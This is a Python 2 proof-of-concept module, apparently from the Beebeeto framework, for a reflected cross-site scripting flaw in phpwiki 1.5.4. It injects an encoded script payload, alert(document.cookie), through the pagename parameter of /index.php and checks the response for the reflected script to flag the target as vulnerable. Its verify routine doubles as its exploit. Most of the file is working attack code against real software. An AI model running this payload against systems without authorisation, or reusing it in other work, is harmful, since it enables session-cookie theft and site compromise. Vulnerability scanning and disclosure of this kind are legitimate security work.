#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2
import urllib
import re

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息       
        'poc':{            
            'id': 'poc-2015-0135',
            'name': 'phpwiki 1.5.4 /index.php  XSS漏洞 PoC',
            'author': 'ali',
            'create_data': '2015-09-02',
            },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
            },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpwiki',
            'vul_versiosn': ['1.5.4'],
            'type': 'Cross Site Scripting',
            'tag': ['phpwiki漏洞','Cross Site Scripting','phpwiki/index.php?pagename='],
            'desc': 'N/A',
            'references': ['https://www.exploit-db.com/exploits/38027/'],
            },
    }

    @classmethod
    def verify(cls, args):
        payload = ('/index.php?pagename=%3C%2Fscript%3E%3Cscript%3Ealert%28d'
                   'ocument.cookie%29%3C%2Fscript%3E%3C!--')
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = urllib2.urlopen(verify_url)
        statecode = urllib.urlopen(verify_url).getcode()
        content = req.read()
        if statecode == 200 and re.search('var pagename  = \'</script><script>alert\(document\.cookie\)</script><!--\'', content):
            args['success'] = True
            args['poc_ret']['vul_url'] = args['options']['target']
        return args
    
    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())